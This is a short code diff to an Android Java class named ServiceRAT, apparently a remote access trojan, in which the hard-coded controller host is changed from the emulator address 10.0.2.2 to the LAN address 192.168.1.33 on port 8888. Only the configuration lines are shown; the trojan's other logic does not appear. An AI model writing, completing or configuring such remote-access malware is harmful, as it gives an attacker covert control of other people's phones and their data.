@@ -10,7 +10,7 @@ import android.view.View;
 import android.widget.Toast;
 
 public class ServiceRAT extends IntentService {
-    private static final String hostname = "10.0.2.2";
+    private static final String hostname = "192.168.1.33";
     private static final int portnumber = 8888;
 
     public ServiceRAT() {
